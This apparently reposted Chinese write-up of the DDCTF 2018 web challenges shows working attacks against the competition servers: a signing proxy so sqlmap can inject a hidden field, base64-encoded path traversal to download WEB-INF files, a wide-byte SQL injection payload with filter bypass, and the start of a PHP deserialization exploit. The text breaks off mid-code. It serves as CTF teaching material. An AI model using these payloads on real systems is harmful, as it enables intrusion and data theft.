> 原文链接: https://www.anquanke.com//post/id/144879 


# DDCTF 2018 writeup(一) WEB篇


                                阅读量   
                                **232519**
                            
                        |
                        
                                                                                    



[![](https://p4.ssl.qhimg.com/t012520ac6c7e3d852e.jpg)](https://p4.ssl.qhimg.com/t012520ac6c7e3d852e.jpg)

### 传送门： [**DDCTF** 2018 writeup(二) 逆向篇 ](https://www.anquanke.com/post/id/145553)

## 一. 关于DDCTF

滴滴出行第二届DDCTF高校闯关赛已经落幕，我们在此公布DDCTF2018writeup，此篇文章由本次比赛第二名HenryZhao提供。此外，比赛平台和赛题将继续开放一年，供选手们学习分享。

比赛平台地址：[http://ddctf.didichuxing.com/](http://ddctf.didichuxing.com/)



## 二. WEB writeup

### 0x01  Web 1 数据库的秘密

猜测存在签名，于是对源码进行分析，签名逻辑位于`main.js`

[![](https://p2.ssl.qhimg.com/t01e22720583068b025.png)](https://p2.ssl.qhimg.com/t01e22720583068b025.png)

分析网页 `main.js`，美化后的 JavaScript 如下：

```
// key 位于主页 JS 中，此处不再单独截图。内容是 adrefkfweodfsdpiru<br style="margin: 0px; padding: 0px; max-width: 100%;">var key="141144162145146153146167145157144146163144160151162165" <br style="margin: 0px; padding: 0px; max-width: 100%;">function signGenerate(obj, key) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    var str0 = '';<br style="margin: 0px; padding: 0px; max-width: 100%;">    for (i in obj) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        if (i != 'sign') `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            str1 = '';<br style="margin: 0px; padding: 0px; max-width: 100%;">            str1 = i + '=' + obj[i];<br style="margin: 0px; padding: 0px; max-width: 100%;">            str0 += str1<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    return hex_math_enc(str0 + key)<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`;<br style="margin: 0px; padding: 0px; max-width: 100%;">var obj = `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    id: '',<br style="margin: 0px; padding: 0px; max-width: 100%;">    title: '',<br style="margin: 0px; padding: 0px; max-width: 100%;">    author: '',<br style="margin: 0px; padding: 0px; max-width: 100%;">    date: '',<br style="margin: 0px; padding: 0px; max-width: 100%;">    time: parseInt(new Date().getTime() / 1000)<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`;<br style="margin: 0px; padding: 0px; max-width: 100%;">function submitt() `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    obj['id'] = document.getElementById('id').value;<br style="margin: 0px; padding: 0px; max-width: 100%;">    obj['title'] = document.getElementById('title').value;<br style="margin: 0px; padding: 0px; max-width: 100%;">    obj['author'] = document.getElementById('author').value;<br style="margin: 0px; padding: 0px; max-width: 100%;">    obj['date'] = document.getElementById('date').value;<br style="margin: 0px; padding: 0px; max-width: 100%;">    var sign = signGenerate(obj, key);<br style="margin: 0px; padding: 0px; max-width: 100%;">    document.getElementById('queryForm').action = "index.php?sig=" + sign + "&amp;time=" + obj.time;<br style="margin: 0px; padding: 0px; max-width: 100%;">    document.getElementById('queryForm').submit()<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

从 JavaScript 中可以得知，签名为特定字符串拼接后的 SHA1，构造方式为 `id=title=author=date=time=adrefkfweodfsdpiru`，每个等号之后连接响应字段值。另外可以看到 obj 中含有`author`，这个输入字段在网页上为 `hidden`状态，十分可疑。

[![](https://p1.ssl.qhimg.com/t01126f5a6f128a30b1.png)](https://p1.ssl.qhimg.com/t01126f5a6f128a30b1.png)

对于此题，我采用了使用 PHP 编写代理页面的方式，对请求进行了代理并签名。之后使用 sqlmap 等通用工具对该 PHP 页面进行注入即可。<br style="margin: 0px; padding: 0px; max-width: 100%;">`proxy.php` 代码如下：

```
&lt;?php<br style="margin: 0px; padding: 0px; max-width: 100%;">@$id = $_REQUEST['id'];<br style="margin: 0px; padding: 0px; max-width: 100%;">@$title = $_REQUEST['title'];<br style="margin: 0px; padding: 0px; max-width: 100%;">@$author = $_REQUEST['author'];<br style="margin: 0px; padding: 0px; max-width: 100%;">@$date = $_REQUEST['date'];<br style="margin: 0px; padding: 0px; max-width: 100%;">$time = time();<br style="margin: 0px; padding: 0px; max-width: 100%;">$sig = sha1('id='.$id.'title='.$title.'author='.$author.'date='.$date.'time='.$time.'adrefkfweodfsdpiru');<br style="margin: 0px; padding: 0px; max-width: 100%;">$ch = curl_init();<br style="margin: 0px; padding: 0px; max-width: 100%;">$post = [<br style="margin: 0px; padding: 0px; max-width: 100%;">    'id' =&gt; $id,<br style="margin: 0px; padding: 0px; max-width: 100%;">    'title' =&gt; $title,<br style="margin: 0px; padding: 0px; max-width: 100%;">    'author' =&gt; $author,<br style="margin: 0px; padding: 0px; max-width: 100%;">    'date' =&gt; $date,<br style="margin: 0px; padding: 0px; max-width: 100%;">];<br style="margin: 0px; padding: 0px; max-width: 100%;">curl_setopt($ch, CURLOPT_URL,"http://116.85.43.88:8080/KREKGJVFPYQKERQR/dfe3ia/index.php?sig=$sig&amp;time=$time");<br style="margin: 0px; padding: 0px; max-width: 100%;">curl_setopt($ch, CURLOPT_HTTPHEADER, array(<br style="margin: 0px; padding: 0px; max-width: 100%;">    'X-Forwarded-For: 123.232.23.245',<br style="margin: 0px; padding: 0px; max-width: 100%;">    ));<br style="margin: 0px; padding: 0px; max-width: 100%;">curl_setopt($ch, CURLOPT_POST, 1);<br style="margin: 0px; padding: 0px; max-width: 100%;">curl_setopt($ch, CURLOPT_POSTFIELDS, $post);<br style="margin: 0px; padding: 0px; max-width: 100%;">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);<br style="margin: 0px; padding: 0px; max-width: 100%;">curl_setopt($ch, CURLOPT_HEADER, true);<br style="margin: 0px; padding: 0px; max-width: 100%;">$ch_out = curl_exec($ch);<br style="margin: 0px; padding: 0px; max-width: 100%;">$ch_info = curl_getinfo($ch);<br style="margin: 0px; padding: 0px; max-width: 100%;">$header = substr($ch_out, 0, $ch_info['header_size']);<br style="margin: 0px; padding: 0px; max-width: 100%;">$body = substr($ch_out, $ch_info['header_size']);<br style="margin: 0px; padding: 0px; max-width: 100%;">http_response_code($ch_info['http_code']);<br style="margin: 0px; padding: 0px; max-width: 100%;">//header($header);<br style="margin: 0px; padding: 0px; max-width: 100%;">//echo $header;<br style="margin: 0px; padding: 0px; max-width: 100%;">echo $body;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

sqlmap 一把梭，对代理 PHP 页面进行注入，注入点果然位于`author`，获得 flag。

> `sqlmap.py -u 'http://127.0.0.1/proxy.php?author=admin' --dump `

**[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0168b3500e9baf2da6.png)**

### 0x02  Web 2 专属链接

**任意文件读取**

打开网页后是一个滴滴的页面，题目中有备注`链接至其他域名的链接与本次CTF无关，请不要攻击`，因此只关注当前 IP 下的内容。

[![](https://p1.ssl.qhimg.com/t01715e5978171d920d.png)](https://p1.ssl.qhimg.com/t01715e5978171d920d.png)

[![](https://p5.ssl.qhimg.com/t01ab15ae8ce4c8c0ec.png)](https://p5.ssl.qhimg.com/t01ab15ae8ce4c8c0ec.png)

网页图标出现了奇怪的花纹，引起注意。对应的是 HTML 中的

```
&lt;link href="/image/banner/ZmF2aWNvbi5pY28=" rel="shortcut icon"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

对 `ZmF2aWNvbi5pY28=` 进行 base64 解码，得到 `favicon.ico`，猜测存在任意文件读取。<br>
使用二进制编辑器打开 `favicon.ico` 后发现文件中多次出现 you can only download .class .xml .ico .ks files 字符串。

[![](https://p2.ssl.qhimg.com/t01b5292a4135bfcc4e.png)](https://p2.ssl.qhimg.com/t01b5292a4135bfcc4e.png)

尝试下载 `web.xml` ，一番寻找后发现其位于`../../WEB-INF/web.xml` ，base64 编码后访问地址 `/image/banner/Li4vLi4vV0VCLUlORi93ZWIueG1s` 下载文件。

从 `web.xml` 中收集信息，比如 `applicationContext.xml` , `mvc-dispatcher-servlet.xml` ,`com.didichuxing.ctf.listener.InitListener` ，并继续下载对应的 xml 与 class 文件。<br style="margin: 0px; padding: 0px; max-width: 100%;">以 `com.didichuxing.ctf.listener.InitListener` 为例，class 文件位于`../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class`。

**如此循环收集信息+下载的过程。**

[![](https://p5.ssl.qhimg.com/t0116f949a45571fe21.png)](https://p5.ssl.qhimg.com/t0116f949a45571fe21.png)

最终下载文件列表如下：

```
.<br style="margin: 0px; padding: 0px; max-width: 100%;">├── class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_controller_HomeController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_dao_FlagDao.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_listener_InitListener.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_model_Flag.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   ├── _.._WEB-INF_classes_com_didichuxing_ctf_service_FlagService.class<br style="margin: 0px; padding: 0px; max-width: 100%;">│   └── _.._WEB-INF_classes_com_didichuxing_ctf_util_StringUtil.class<br style="margin: 0px; padding: 0px; max-width: 100%;">└── xml<br style="margin: 0px; padding: 0px; max-width: 100%;">    ├── _.._WEB-INF_applicationContext.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">    ├── _.._WEB-INF_classes_mapper_FlagMapper.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">    ├── _.._WEB-INF_classes_mybatis_config.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">    ├── _.._WEB-INF_classes_sdl.ks<br style="margin: 0px; padding: 0px; max-width: 100%;">    ├── _.._WEB-INF_mvc-dispatcher-servlet.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">    └── _.._WEB-INF_web.xml<br style="margin: 0px; padding: 0px; max-width: 100%;">2 directories, 14 files<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

**源码审计**

使用 `jd-gui` 审计 `class` 文件，

`listener/InitListener.class`<br style="margin: 0px; padding: 0px; max-width: 100%;">初始化生成 flag，加密flag，Hmac email 并存储。代码中可看到 email 为 HmacSHA256 ，密钥为 `sdl welcome you`` !`<br style="margin: 0px; padding: 0px; max-width: 100%;">蓝色框内为加密 flag 相关代码，红色框内为 Hmac email 相关代码。

[![](https://p5.ssl.qhimg.com/t01f2dfe0ec916117be.png)](https://p5.ssl.qhimg.com/t01f2dfe0ec916117be.png)

`controller/user/FlagController.class`<br>
用 email Hmac 获取加密后的 flag ，使用了 getFlagByEmail 函数，测试 flag 使用了 exist 函数。

[![](https://p4.ssl.qhimg.com/t01090bfd681288bb64.png)](https://p4.ssl.qhimg.com/t01090bfd681288bb64.png)

根据以上两个函数于 `_.._WEB-INF_classes_mapper_FlagMapper.xml` 中进行分析。<br>
可以发现存储于 email 列的内容为 Hmac email，当我们验证 flag 是查找的是 originFlag，也就是原始 flag。

```
&lt;resultMap id="flag" type="com.didichuxing.ctf.model.Flag"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    &lt;id column="id" property="id"/&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    &lt;result column="email" property="email"/&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    &lt;result column="flag" property="flag"/&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;/resultMap&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;insert id="save"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    INSERT INTO t_flag VALUES (#`{`id`}`, #`{`email`}`, #`{`flag`}`, #`{`originFlag`}`,#`{`uuid`}`,#`{`originEmail`}`)<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;/insert&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">......<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;select id="getByEmail" resultMap="flag"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    SELECT *<br style="margin: 0px; padding: 0px; max-width: 100%;">    FROM t_flag<br style="margin: 0px; padding: 0px; max-width: 100%;">    WHERE email = #`{`email`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;/select&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">......<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;select id="exist" resultType="java.lang.Integer"&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">    SELECT *<br style="margin: 0px; padding: 0px; max-width: 100%;">    FROM t_flag<br style="margin: 0px; padding: 0px; max-width: 100%;">    WHERE originFlag = #`{`originFlag`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;/select&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

使用 `email`` 的 ``Hmac`从 `/flag/getflag/` 获取 flag 密文，相关计算方法可从初始化的 class 中获得。<br>
此处我使用了 java 实现相关逻辑，算得 Hmac email 为 `456FE65F08FB5F3559DCABA7AE1A3209BA029096A168456BCDA37D77A6B766B6`，相关代码见后。

```
curl -X POST http://116.85.48.102:5050/flag/getflag/456FE65F08FB5F3559DCABA7AE1A3209BA029096A168456BCDA37D77A6B766B6 -v<br style="margin: 0px; padding: 0px; max-width: 100%;">*   Trying 116.85.48.102...<br style="margin: 0px; padding: 0px; max-width: 100%;">* Connected to 116.85.48.102 (116.85.48.102) port 5050 (#0)<br style="margin: 0px; padding: 0px; max-width: 100%;">&gt; POST /flag/getflag/456FE65F08FB5F3559DCABA7AE1A3209BA029096A168456BCDA37D77A6B766B6 HTTP/1.1<br style="margin: 0px; padding: 0px; max-width: 100%;">&gt; Host: 116.85.48.102:5050<br style="margin: 0px; padding: 0px; max-width: 100%;">&gt; User-Agent: curl/7.47.0<br style="margin: 0px; padding: 0px; max-width: 100%;">&gt; Accept: */*<br style="margin: 0px; padding: 0px; max-width: 100%;">&gt;<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt; HTTP/1.1 200<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt; Content-Type: text/plain;charset=ISO-8859-1<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt; Content-Length: 529<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt; Date: Sat, 21 Apr 2018 04:22:30 GMT<br style="margin: 0px; padding: 0px; max-width: 100%;">&lt;<br style="margin: 0px; padding: 0px; max-width: 100%;">Encrypted flag : 15441B42CF86F094971ECC8F36DBDA16390DF0699E2A3DE21A903D4E48DB4D8671A12F60B5B4CAE6391496A555C70E4D168C79EEB891507D3341244384F38500BBAC3CD464F13C8C42EBE2441BFFA38152B1CB4B3B8135402E3EF0F017F270829B3EAFF84FAE7E6DFFB6C41ED28A5AD666526F590BD611FAC0D4C71C85B8B0C774A98D03518B442C85B24F6EDD65A34BCF8A78EBF73055ABEBC7EDACFB8B6080457F1CA0517365E1B195F618FBA527799F63F452BABC4BAE3124CB451CB8632CFF36D7BA9F042EEE7D43364717AF182F82458E22B855ED4EB4ED2F913C17814563F8FC4B11513E76209B6E07C928B3EE5073BB3B1658DA3<br style="margin: 0px; padding: 0px; max-width: 100%;">* Connection #0 to host 116.85.48.102 left intact<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

获得 flag 密文之后，再按照反编译的 class 代码进行解密。<br style="margin: 0px; padding: 0px; max-width: 100%;">这里有个坑，程序加密 flag 时，使用的是 **私钥** ，因此我们应当使用 **公钥** 进行解密操作。

解密后得到`DDCTF`{`6365053991435533423`}``。

编写 java，计算 Hmac 与解密 flag ，代码如下：

```
import java.io.File;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.io.FileInputStream;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.io.IOException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.io.InputStream;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.io.PrintStream;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.InvalidKeyException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.Key;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.KeyStore;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.KeyStoreException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.NoSuchAlgorithmException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.SecureRandom;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.UnrecoverableKeyException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.cert.CertificateException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.util.Properties;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.util.UUID;<br style="margin: 0px; padding: 0px; max-width: 100%;">import javax.crypto.BadPaddingException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import javax.crypto.Cipher;<br style="margin: 0px; padding: 0px; max-width: 100%;">import javax.crypto.IllegalBlockSizeException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import javax.crypto.Mac;<br style="margin: 0px; padding: 0px; max-width: 100%;">import javax.crypto.NoSuchPaddingException;<br style="margin: 0px; padding: 0px; max-width: 100%;">import javax.crypto.spec.SecretKeySpec;<br style="margin: 0px; padding: 0px; max-width: 100%;">import java.security.*;<br style="margin: 0px; padding: 0px; max-width: 100%;">public class Main `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public static void main(String[] args) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        try `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            String email = "9221799447186232152@didichuxing.com";<br style="margin: 0px; padding: 0px; max-width: 100%;">            String flag_e_hex="15441B42CF86F094971ECC8F36DBDA16390DF0699E2A3DE21A903D4E48DB4D8671A12F60B5B4CAE6391496A555C70E4D168C79EEB891507D3341244384F38500BBAC3CD464F13C8C42EBE2441BFFA38152B1CB4B3B8135402E3EF0F017F270829B3EAFF84FAE7E6DFFB6C41ED28A5AD666526F590BD611FAC0D4C71C85B8B0C774A98D03518B442C85B24F6EDD65A34BCF8A78EBF73055ABEBC7EDACFB8B6080457F1CA0517365E1B195F618FBA527799F63F452BABC4BAE3124CB451CB8632CFF36D7BA9F042EEE7D43364717AF182F82458E22B855ED4EB4ED2F913C17814563F8FC4B11513E76209B6E07C928B3EE5073BB3B1658DA3F6692A2FC7CE6B230";<br style="margin: 0px; padding: 0px; max-width: 100%;">            // Hmac email <br style="margin: 0px; padding: 0px; max-width: 100%;">            SecretKeySpec signingKey = new SecretKeySpec("sdl welcome you !".getBytes(), "HmacSHA256");<br style="margin: 0px; padding: 0px; max-width: 100%;">            Mac mac = Mac.getInstance("HmacSHA256");<br style="margin: 0px; padding: 0px; max-width: 100%;">            mac.init(signingKey);<br style="margin: 0px; padding: 0px; max-width: 100%;">            System.out.println(byte2hex(mac.doFinal(String.valueOf(email.trim()).getBytes())));<br style="margin: 0px; padding: 0px; max-width: 100%;">            // Decrypt flag<br style="margin: 0px; padding: 0px; max-width: 100%;">            String p = "sdlwelcomeyou";<br style="margin: 0px; padding: 0px; max-width: 100%;">            String ksPath = "sdl.ks";<br style="margin: 0px; padding: 0px; max-width: 100%;">            KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());<br style="margin: 0px; padding: 0px; max-width: 100%;">            FileInputStream inputStream = new FileInputStream(ksPath);<br style="margin: 0px; padding: 0px; max-width: 100%;">            keyStore.load(inputStream, p.toCharArray());<br style="margin: 0px; padding: 0px; max-width: 100%;">            KeyStore.PasswordProtection keyPassword =       //Key password<br style="margin: 0px; padding: 0px; max-width: 100%;">                    new KeyStore.PasswordProtection("sdlwelcomeyou".toCharArray());<br style="margin: 0px; padding: 0px; max-width: 100%;">            KeyStore.PrivateKeyEntry privateKeyEntry = (KeyStore.PrivateKeyEntry) keyStore.getEntry("www.didichuxing.com", keyPassword);<br style="margin: 0px; padding: 0px; max-width: 100%;">            java.security.cert.Certificate cert = keyStore.getCertificate("www.didichuxing.com");<br style="margin: 0px; padding: 0px; max-width: 100%;">            // Get **public key** for decrypt<br style="margin: 0px; padding: 0px; max-width: 100%;">            PublicKey publicKey = cert.getPublicKey(); <br style="margin: 0px; padding: 0px; max-width: 100%;">            PrivateKey privateKey = privateKeyEntry.getPrivateKey();<br style="margin: 0px; padding: 0px; max-width: 100%;">            Key key = keyStore.getKey("www.didichuxing.com", p.toCharArray());<br style="margin: 0px; padding: 0px; max-width: 100%;">            System.out.println(key.getAlgorithm());<br style="margin: 0px; padding: 0px; max-width: 100%;">            Cipher cipher = Cipher.getInstance(key.getAlgorithm());<br style="margin: 0px; padding: 0px; max-width: 100%;">            // 2 for decrypt<br style="margin: 0px; padding: 0px; max-width: 100%;">            cipher.init(2, publicKey); <br style="margin: 0px; padding: 0px; max-width: 100%;">            System.out.println(new String(cipher.doFinal(hex2byte(flag_e_hex))));<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">        catch (KeyStoreException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (IOException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (NoSuchAlgorithmException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (CertificateException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (UnrecoverableKeyException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (NoSuchPaddingException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (InvalidKeyException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (IllegalBlockSizeException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (BadPaddingException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}` catch (UnrecoverableEntryException e) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            e.printStackTrace();<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public static String byte2hex(byte[] b)<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        StringBuilder hs = new StringBuilder();<br style="margin: 0px; padding: 0px; max-width: 100%;">        for (int n = 0; (b != null) &amp;&amp; (n &lt; b.length); n++) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            String stmp = Integer.toHexString(b[n] &amp; 0xFF);<br style="margin: 0px; padding: 0px; max-width: 100%;">            if (stmp.length() == 1)<br style="margin: 0px; padding: 0px; max-width: 100%;">                hs.append('0');<br style="margin: 0px; padding: 0px; max-width: 100%;">            hs.append(stmp);<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">        return hs.toString().toUpperCase();<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public static byte[] hex2byte(String str)<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        byte[] bytes = new byte[str.length() / 2];<br style="margin: 0px; padding: 0px; max-width: 100%;">        for (int i = 0; i &lt; bytes.length; i++)<br style="margin: 0px; padding: 0px; max-width: 100%;">        `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            bytes[i] = (byte) Integer<br style="margin: 0px; padding: 0px; max-width: 100%;">                    .parseInt(str.substring(2 * i, 2 * i + 2), 16);<br style="margin: 0px; padding: 0px; max-width: 100%;">        `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">        return bytes;<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">
```

### 0x03 Web 3 注入的奥妙

**宽字节注入**

网页注释给出了一个 Big-5 编码表的链接，故使用宽字节。关于宽字节注入我参考了这篇文章（http://www.evilclay.com/2017/07/20/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6/）。<br>
查询 Big-5 编码表，寻找编码结尾为 5C 的字符，此处给出一个可用 payload `%E8%B1%B9'`。

[![](https://p3.ssl.qhimg.com/t0167c97bbd7027e9cc.png)](https://p3.ssl.qhimg.com/t0167c97bbd7027e9cc.png)

注入过程中发现字符串单次替换，例如 `union` `users` 等，手工注入读取 `information_schema` 获得表名与列名。<br style="margin: 0px; padding: 0px; max-width: 100%;">由于存在不同数据使用了不同编码导致报错，我们对查询的参数进行强制编码转换 `COLLATE utf8_general_ci`。

此处给出一个最终列出 `router_rules` 数据的 payload：

> /well/getmessage/1%E8%B1%B9’ and 2=1 uniunionon select `id`,`pattern` COLLATE utf8_general_ci,`action` COLLATE utf8_general_ci from route_rules – –

[![](https://p5.ssl.qhimg.com/t017bdaa86243e2f9d5.png)](https://p5.ssl.qhimg.com/t017bdaa86243e2f9d5.png)

访问 `static/bootstrap/css/backup.css` 获得网站代码备份文件，开始代码审计。

**PHP 反序列化**

对网站源代码进行审计，发现 `Controller/Justtry.php` 中 `try($serialize)` 存在可控的反序列化，故在构造析构函数中寻找能够利用的点。<br>
于 `Helper/Test.php` 中发现调用 `getflag()` 且存在 `$this-&gt;fl-&gt;get($user)` 故推测 `$fl` 应为 `Flag`类。<br>
题目关键代码如下：

```
// Controller/Justtry.php<br style="margin: 0px; padding: 0px; max-width: 100%;">public function try($serialize)<br style="margin: 0px; padding: 0px; max-width: 100%;">`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    unserialize(urldecode($serialize), ["allowed_classes" =&gt; ["IndexHelperFlag", "IndexHelperSQL","IndexHelperTest"]]);<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">// Helper/Test.php<br style="margin: 0px; padding: 0px; max-width: 100%;">class Test<br style="margin: 0px; padding: 0px; max-width: 100%;">`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $user_uuid;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $fl;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public function __destruct()<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $this-&gt;getflag('ctfuser', $this-&gt;user_uuid);<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public function getflag($m = 'ctfuser', $u = 'default')<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        //TODO: check username<br style="margin: 0px; padding: 0px; max-width: 100%;">        $user=array(<br style="margin: 0px; padding: 0px; max-width: 100%;">            'name' =&gt; $m,<br style="margin: 0px; padding: 0px; max-width: 100%;">            'id' =&gt; $u<br style="margin: 0px; padding: 0px; max-width: 100%;">        );<br style="margin: 0px; padding: 0px; max-width: 100%;">        //懒了直接输出给你们了<br style="margin: 0px; padding: 0px; max-width: 100%;">        echo 'DDCTF`{`'.$this-&gt;fl-&gt;get($user).'`}`';<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">`}`<br style="margin: 0px; padding: 0px; max-width: 100%;">// Helper/Flag.php<br style="margin: 0px; padding: 0px; max-width: 100%;">class Flag<br style="margin: 0px; padding: 0px; max-width: 100%;">`{`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public $sql;<br style="margin: 0px; padding: 0px; max-width: 100%;">    public function __construct()<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $this-&gt;sql=new SQL();<br style="margin: 0px; padding: 0px; max-width: 100%;">    `}`<br style="margin: 0px; padding: 0px; max-width: 100%;">    public function get($user)<br style="margin: 0px; padding: 0px; max-width: 100%;">    `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">        $tmp=$this-&gt;sql-&gt;FlagGet($user);<br style="margin: 0px; padding: 0px; max-width: 100%;">        if ($tmp['status']===1) `{`<br style="margin: 0px; padding: 0px; max-width: 100%;">            return 